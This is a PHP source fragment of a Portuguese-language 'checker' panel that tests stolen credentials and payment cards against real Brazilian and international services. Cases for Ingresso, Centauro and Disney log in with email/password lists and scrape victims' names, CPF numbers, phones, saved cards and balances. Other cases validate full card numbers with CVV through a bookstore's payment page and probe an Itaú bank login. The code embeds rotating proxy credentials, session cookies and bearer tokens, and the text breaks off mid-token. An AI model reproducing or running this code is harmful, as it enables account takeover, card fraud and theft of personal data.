        return preg_replace("/[^0-9]/", "", $str);
    }


function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


function getString($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}



if (file_exists(getcwd() . '/cookie.txt')) {
    unlink(getcwd() . '/cookie.txt');
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
    extract($_GET);
}

function getStr2($string,$start,$end) {
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}


function Curl($url = false, $post = false, $header = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        $exec = curl_exec($ch);
        return $exec;
    }
//*//*#Curl//*////*//

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.ingresso.com/v1/token");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.11.0");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: api.ingresso.com',
        'X-APP-ORIGIN: TicketingAppAndroid',
        'X-APP-VERSION: 2.9.1',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Connection: keep-alive'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$email.'&password='.$senha.'&grant_type=password&client_origin=android%3A17085c27ee70f283');
    $resposta = curl_exec($ch);
    $dados = json_decode($resposta, true);
    $userid = $dados['user_id'];
    $token = $dados['access_token'];


    if (strpos($resposta, 'access_token')) {

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ingresso.com/v1/users/".$userid."/orders?renderView=my-orders&deviceId=17085c27ee70f283&limit=10&skip=0&cancelled=true ");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
        curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.11.0");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.ingresso.com',
            'X-APP-ORIGIN: TicketingAppAndroid',
            'X-APP-VERSION: 2.9.1',
            'Accept: application/json',
            'Content-Type: application/x-www-form-urlencoded',
            'Authorization: Bearer '.$token.'',
            'Connection: keep-alive'));
        $resposta2 = curl_exec($ch);

        if (strpos($resposta2, 'Aprovado')) {
            $pedidosAprovados = "<font class='label label-success'>Contem pedidos aprovados</font>";
        }else {
            $pedidosAprovados = "<font class='label label-danger'>Não contem pedidos aprovados</font>";
        }


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ingresso.com/v1/users/".$userid."/payments");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
        curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.11.0");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.ingresso.com',
            'X-APP-ORIGIN: TicketingAppAndroid',
            'X-APP-VERSION: 2.9.1',
            'Accept: application/json',
            'Content-Type: application/x-www-form-urlencoded',
            'Authorization: Bearer '.$token.'',
            'Connection: keep-alive'));
        $resposta3 = curl_exec($ch);

        if (strpos($resposta3, 'lastFourDigits')) {
            $ultimosdigitosCC = getStr($resposta3, '"lastFourDigits":"','",');
            $bandeira = getStr($resposta3, '"cardType":"','",');
            $cc = "<font class='label label-warning'>".$bandeira." - ".$ultimosdigitosCC."</font>";
        }else{
            $cc = "<font class='label label-danger'>Sem cartão cadastrado</font>";
        }



        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ingresso.com/v1/users/".$userid."");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
        curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.11.0");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.ingresso.com',
            'X-APP-ORIGIN: TicketingAppAndroid',
            'X-APP-VERSION: 2.9.1',
            'Accept: application/json',
            'Content-Type: application/x-www-form-urlencoded',
            'Authorization: Bearer '.$token.'',
            'Connection: keep-alive'));
        $resposta4 = curl_exec($ch);

        $telefone = getStr($resposta4, '"phoneNumber":"','",');
        $localcity = getStr($resposta4, '"city":"','",');
        $localstate = getStr($resposta4, '"stateRegion":"','",');



echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <font class='label label-primary'> ".$dados['user_first_name']."</font>&nbsp <font class='label label-primary'>".$telefone." </font>&nbsp <font class='label label-default'>".$localcity." - ".$localstate." </font>&nbsp ".$pedidosAprovados."&nbsp ".$cc." - #striker-";
debitar_creditos("0.05");
contar_login();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha | $loginEmail - #STRIKER";



}
break;
case 'Allbins':
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function deletarCookies() {
  if (file_exists("elo.txt")) {
    unlink("elo.txt");
  }
}

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

$loadtime = time();
function getStrc($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

//---------------------------//GERAR DADOS//------------------------//

$nomes = array("Gabriel","Jose","Eduardo","Victor","Rafael","Bruno","Douglas","Marcos","Matheus","Cleiton","Vaenssa","Luisa","Antonia","Ames","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Elizabeth","Linda","Barbara","Susan","Jessica","Margaret","Sarah","Alessia","Alexa","Alexandra","Alice","Alicia","Aline","Alison","Alriana","Alzira","Amalia","Amanda","Amelia","America","Ana","Anabel","Anabelle","Ananda","Anastacia","Andrea","Andressa","Anete","Angela","Angelica","Angelina","Anita","Antuerpia","Aparecida","Araci","Ariane","Ariene","Arisla","Arissa","Arlette","Arminda","Aryana","Astrid","Audrey","Adelinda","Assun","Aura","Aurelia","Aarao","Abdala","Abdemis","Abel","Abelardo","Abraao","Acacio","Adalberto","Adamastor","Adao","Adauto","Ademar","Jose","Lucas","Ayrton","Patricia","Patrick","Diego","Arnaldo","Josevaldo","Aiyrton","Renan","Maria","Genivaldo","Joseph","Michel","Otavio","Miguel","Thais","Carol","Carlos","Edvaldo","Luiza");

$sobreNome = array("Abreu","Ribeiro","Rocha","Lima","Godoy","Diniz","Andrade","Oliveira","Martins","Ferreira","Souza","Silva","Araujo","Montenegro","Anciaes","Junior","Andrades","monteiro","Joaquin","Coltinho");

$rand1 = rand(0, 107);

$rand2 = rand(0, 19);

$rand3 = rand(0, 4);

$nome = $nomes[$rand1];

$sobre = $sobreNome[$rand2];

$mail = array("yahoo","gmail","bol","hotmail","outlook");

$Mail = $mail[$rand3];

$valor1 = rand(1, 9);
$valor2 = rand(10, 99);

$horario = date("H:i:s");
$data = date("d/m/y");
$ip = $_SERVER['REMOTE_ADDR'];

//---------------------------//Gerador 4Devs//------------------------//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/4devsdados.txt");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/4devsdados.txt");
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=H&idade=22&pontuacao=S&cep_estado=&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, 1);

$name = $dados1["nome"];
$email = $dados1["email"];
$cpf = $dados1["cpf"];
$rg = $dados1["rg"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$numero = $dados1["numero"];
$bairro = $dados1["bairro"];
$cidade = $dados1["cidade"];
$estado = $dados1["estado"];
$telefone_fixo = $dados1["telefone_fixo"];
$celular = $dados1["celular"];

/////////////////////////////////////////////////////////////////////////
$email2 = "$nome$sobre".rand(000000, 99999)."%40$Mail.com";
$nomes2 = "$nome+$sobre";
$senha1 = rand(000000,99999999);
/////////////////////////////////////////////////////////////////////////

//---------------------------//CONSULTA BIN//------------------------//
include("consultarbin.php");
$bin = " ($pais) $bandeira $banco $level $paiscode";
//---------------------------///////////////------------------------//


//---------------------------// POST ( 0 ) //------------------------//





//Pagamento
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'qdkkubge-rotate:6pdjjiy1yac3');
curl_setopt($ch, CURLOPT_URL, 'https://www.livrariaitagyba.com.br/PayCard.aspx');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'Content-type: application/x-www-form-urlencoded',
'Accept: */*',
'Origin: https://www.livrariaitagyba.com.br',
'Referer: https://www.livrariaitagyba.com.br/pagamento/',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie: ASP.NET_SessionId=ki5bndfbebk3q4hzplmgdvxz; TRSKEY=0062580a-f3ca-410f-8ff6-4a96ee3a8bb90d6e2a7f-8be5-49f5-898c-420963fe20c42745828f-b9f3-481a-8803-4fabe00f4f37-187-44-151-19-20201220T120222; ORIGN=https://www.livrariaitagyba.com.br/; REGISTER=BUY=000026902523cc951a-93b2-439d-b2f3-bf0ec13327d99261c831-8e5e-4b66-ac2c-9960b3b19fe040d16d8f-961a-43bb-ae71-53bda50b1a48-187-44-151-19-20201220T120253; ASPSESSIONIDQGSDABRR=DMBBHKKDJBNLFNMKDJIOACKM; KEYIPCOD=187441511724bcaac1-2746-4725-9a0a-f8d4d0a49b8e'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'Nped=269025&moeda=13&parc_cartao=4&crt='.$cc.'&mes='.$mes.'&ano='.$ano.'&name_crt=Jefferson+dos+Santos&codseg='.$cvv.'&cpf=01556540043');
$r4 = curl_exec($ch);



$valores = array('R$ 1,00','R$ 50,50','R$ 50,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];

if (strpos($r4, "Identified moderate risk by the issuer.") !== false) {

echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $cc|$mes|$ano|$cvv | Debitou : $debitouu | Tempo de Resposta: ". (time() - $loadtime) ." seg |<span class='badge badge-light'> $bin</span>  - #striker-";
debitar_creditos("1.00");
contar_cc();
}else if(stripos($r4, 'invalid security code') !==false ){
	
  die("<font color='lime'> Aprovada </font>➜ $lista |  Retorno: Unauthorized. Invalid security code| ");
}else if (strpos($r4, 'Pague com a Rede:<\/strong>') !==false){

$msg = puxar($r4,'Pague com a Rede:<\/strong>','\t\t\t<\/div>');
echo "Reprovada ➔ $lista | Retorno: [<font color='red'>$msg</font>] <br>";
}else{
    $cod =  "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $cc|$mes|$ano|$cvv | $msg |- #STRIKER";
    }


echo $cod;
break;
case 'centauro':
    error_reporting(0);
    extract($_REQUEST);

    
    function multiexplode ($delimiters,$string) {
        $ready = str_replace($delimiters, $delimiters[0], $string);
        $launch = explode($delimiters[0], $ready);
        return  $launch;
    }

    list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$lista);

    function dados($string, $start, $end, $num){ 
        $str = explode($start, $string); 
        $str = explode($end, $str[$num]); 
        return $str[0]; 
    }
    if (file_exists(getcwd().'/cookie.txt')){
            unlink(getcwd().'/cookie.txt');
    }
    

            $ch = curl_init();  //iniciar o cURL
            curl_setopt($ch, CURLOPT_URL, "https://api.centauro.appsbnet.com.br/v2.1/clientes/login");     
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
            curl_setopt($ch, CURLOPT_USERAGENT, "Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0); 
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.centauro.appsbnet.com.br',
            'Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)',
            'x-client-UserAgent: android',
            'x-cv-id: 14',
            'Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==',
            'Content-Type: application/json; charset=utf-8',
            'Connection: keep-alive'
            ));
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usuario":"'.$email.'","senha":"'.$senha.'","ManterLogado":false}');   
            $resultad = curl_exec($ch);

            $token = dados($resultad, '"token":"','"', 1);
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.centauro.appsbnet.com.br/v2.1/clientes");
          curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'exefolql-rotate:stbegjtf7fnh');
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
            curl_setopt($ch, CURLOPT_USERAGENT, "Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)");
            curl_setopt($ch, CURLOPT_COOKIESESSION, 0);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.centauro.appsbnet.com.br',
            'Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)',
            'x-client-UserAgent: android',
            'x-cv-id: 14',
            'x-client-token: '.$token.'',
            'Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==',
            'Connection: keep-alive'
            ));
            $result = curl_exec($ch);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.centauro.appsbnet.com.br/v2.2/cartoes");
            curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
           curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'exefolql-rotate:stbegjtf7fnh');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
            curl_setopt($ch, CURLOPT_USERAGENT, "Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)");
            curl_setopt($ch, CURLOPT_COOKIESESSION, 0);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.centauro.appsbnet.com.br',
            'Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)',
            'x-client-UserAgent: android',
            'x-cv-id: 14',
            'x-client-token: '.$token.'',
            'Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==',
            'Connection: keep-alive'
            ));
            $result3 = curl_exec($ch);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.centauro.appsbnet.com.br/v2.2/clientes/valetrocas");
              curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
             curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'exefolql-rotate:stbegjtf7fnh');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
            curl_setopt($ch, CURLOPT_USERAGENT, "Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)");
            curl_setopt($ch, CURLOPT_COOKIESESSION, 0);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.centauro.appsbnet.com.br',
            'Centauro/1.9.6 (samsung greatqltecs; 4.4.2 API 19)',
            'x-client-UserAgent: android',
            'x-cv-id: 14',
            'x-client-token: '.$token.'',
            'Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==',
            'Connection: keep-alive'
            ));
       $result4 = curl_exec($ch);
       
            $nome = dados($result, '"nome":"','"', 1);
            $sobre = dados($result, '"sobrenome":"','"', 1);
            $cpf = dados($result, '"cpf":"','"', 1);
            $nasci = dados($result, '"dataDeNascimento":"','T', 1);
            $cid = dados($result, '"cidade":"','"', 1);
            $est = dados($result, '"estado":"','"', 1);

            if (strpos($result, '"possuiCompraRapidaHabilitada":true') !== false) {
            $pedi = '<span class="badge badge-info"> Sim </span>';
            }else{
            $pedi = '<span class="badge badge-danger"> Não </span> ';
            }

            $cc = dados($result3, '"numeroMascarado":"','"', 1);
            $op = dados($result3, '"administradora":"','"', 1);
            $val = dados($result3, '"mesValidade":',',', 1);
            $ano = dados($result3, '"anoValidade":',',', 1);

            $saldo = dados($result4, '"saldo":"','"', 1);
            $valor = dados($result4, '"valor":"','"', 1);

            if (strpos($result3, '"cartoesOneClickBuy"') !== false) {
            $Cartão = '<span class="badge badge-info"> Sim </span> ] [ Operadora: <span class="badge badge-info"> '.$op.' </span> ] [ Num CC: <span class="badge badge-info"> '.$cc.' </span> ] [ Validade: <span class="badge badge-info"> '.$val.'|'.$ano.' </span>';
            }else{
            $Cartão = '<span class="badge badge-danger"> Não </span> ';
            }

            if (strpos($result4, '"podeUtilizar"') !== false) {
            $sald = '<span class="badge badge-info"> Sim </span> ] [ Saldo: <span class="badge badge-info"> '.$saldo.' </span> ] [ Valor: <span class="badge badge-info"> '.$valor.' </span>';
            }else{
            $sald = '<span class="badge badge-danger"> Não </span> ';
            }

            #echo $result4;
 


        $dados = 'Nome: <span class="badge badge-info"> '.$nome.' '.$sobre.' </span> ] [ Cpf: <span class="badge badge-info"> '.$cpf.' </span> ] [ Data de Nasc: <span class="badge badge-info"> '.$nasci.' </span> ] [ Cidade: <span class="badge badge-info"> '.$cid.' </span> ] [ Estado: <span class="badge badge-info"> '.$est.' </span> ] [ OneClick: '.$pedi.' ] [Cartão Vinculado: '.$Cartão.' ] [ Vale: '.$sald.'';

        
        if (strpos($resultad, '"token"') !== false) {
        echo '<span class="badge badge-success">#Aprovada</span> -> '.$email.'|'.$senha.' [ '.$dados.' ] <span class="badge badge-light">@MadibuX</span><br>';
    }else{
        echo '<align="left"><span class="badge badge-danger">#Reprovada</span> → '.$email.'|'.$senha.' </font><br>';

    }
if (file_exists(getcwd().'/cookie.txt')){
            unlink(getcwd().'/cookie.txt');
    }
 break;
 case 'hiper':
extract($_GET);
error_reporting(0);
if (file_exists(getcwd().('/cookie.txt'))) { 
    @unlink('cookie.txt'); 
}

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end, $str[1]);
	return $str[0];
}	

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i <$c; $i++) {
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]),trim($explode[2]),trim($explode[3]));
	}
}
function Testar($numero,$mes,$ano,$cvv){
	if (file_exists(getcwd()."/cookies.txt")) {
		unlink(getcwd()."/cookies.txt");
	}

	//VARIAVEIS DE CONFIG

	$url = "";

	$userAgent = "";

	$postField = '';



	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://internetnc2.itau.com.br/router-app/router");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'Host: internetnc2.itau.com.br',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://internetnc.itau.com.br',
'Referer: https://internetnc.itau.com.br/',
'Upgrade-Insecure-Requests: 1',
		'Connection: Keep-Alive'));

	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'usuario.cartao='.$numero.'&usuario.cnpj=&portal=003&pre-login=pre-login&destino=&tipoLogon=9');
	$resposta = curl_exec($ch);
	//echo $resposta;
		$nome = GetStr($resposta, '<h1>','</h1>');

#FEITO POR PL4NET 11937673369 WHATSAPP




		if (strpos($resposta, 'Digite sua senha')) {

		echo "<font color='#01DF01'> CAPTURADA »</font> ".$numero."|".$mes."|".$ano."|".$cvv." TITULAR: ".$nome." </font><br />";
		flush();
		ob_flush();
		debitar_creditos("1.00");
contar_cc();
	}else{
		echo "<font color='#FF0000'> REPROVADA » </font> ".$cc."|".$mes."|".$ano."|".$cvv." <br /></font> ";
		flush();
		ob_flush();
	}
}
break;
case 'disney':
error_reporting(0);


function multiexplode($delimiters, $string) {
	$partida = str_replace($delimiters, $delimiters[0], $string);
	$executar = explode($delimiters[0], $partida);
	return $executar;
}
$lista = $_REQUEST['lista'];
$email = multiexplode(array(";", ":", "|", ">"), $lista)[0];
$senha = multiexplode(array(";", ":", "|", ">"), $lista)[1];


function puxar($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
} 

if (file_exists("cookie.txt")) {
        unlink("cookie.txt"); 
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://global.edge.bamgrid.com/idp/login");
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'exefolql-rotate:stbegjtf7fnh');
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'tseilddq-rotate:k2xzklxjb74y');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_USERAGENT, "BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) xiaomi Redmi Note 6 Pro (PKQ1.180904.001; Linux; 9; API 28)");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: global.edge.bamgrid.com',
'content-length: 54',
'accept: application/json; charset=utf-8',
'authorization: Bearer eyJraWQiOiI4ODA0OGI3MS1jMjhlLTQ5MDQtYWMwOS03NzdiMTFmNzUyNDAiLCJhbGciOiJFZERTQSJ9.eyJzdWIiOiI2YThlNTliMy0zZGVjLTQwMGItYmVjMi03ODRhMmRiYTVjNmQiLCJuYmYiOjE2MDY0ODc2MjIsInBhcnRuZXJOYW1lIjoiZGlzbmV5IiwiaXNzIjoidXJuOmJhbXRlY2g6c2VydmljZTp0b2tlbiIsImNvbnRleHQiOnsiYWN0aXZlX3Byb2ZpbGVfaWQiOiJiODMzYmI2OC01OWFmLTQzYzItYjc2MC04ZjM5M2UwYzk1YTMiLCJ1cGRhdGVkX29uIjoiMjAyMC0xMS0yN1QxNDozMzo0Mi42NjArMDAwMCIsInN1YnNjcmlwdGlvbnMiOltdLCJjb3VudHJ5X3NldHRpbmdzIjp7ImNvZGUiOiJCUiIsInRpbWV6b25lIjp7InV0Y19vZmZzZXQiOiItMDM6MDAiLCJuYW1lIjoiQW1lcmljYVwvU2FvX1BhdWxvIn0sInJhdGluZ19zeXN0ZW1zIjpbImRqY3RxIl19LCJleHBpcmVzX29uIjoiMjAyMC0xMS0yN1QxODozMzo0Mi42NjArMDAwMCIsImV4cGVyaW1lbnRzIjp7fSwicHJvZmlsZXMiOlt7Imdyb3VwX3dhdGNoIjp7ImVuYWJsZWQiOnRydWV9LCJraWRzX21vZGVfZW5hYmxlZCI6ZmFsc2UsInBsYXliYWNrX3NldHRpbmdzIjp7InByZWZlcl8xMzMiOmZhbHNlfSwicGFyZW50YWxfY29udHJvbHMiOnsibWF0dXJpdHlfcmF0aW5nIjp7InJhdGluZ19zeXN0ZW0iOiJNUEFBQW5kVFZQRyIsImNvbnRlbnRfbWF0dXJpdHlfcmF0aW5nIjoiIiwiaW1wbGllZF9tYXR1cml0eV9yYXRpbmciOjB9LCJlbmFibGVkIjp0cnVlfSwiYWN0aXZlIjp0cnVlLCJpZCI6ImI4MzNiYjY4LTU5YWYtNDNjMi1iNzYwLThmMzkzZTBjOTVhMyIsImF2YXRhciI6eyJpZCI6IjQ0MmFmN2RiLTg1ZjctNWUxZC05NmYwLWIyYzUxN2JlNDA4NSJ9LCJ0eXBlIjoid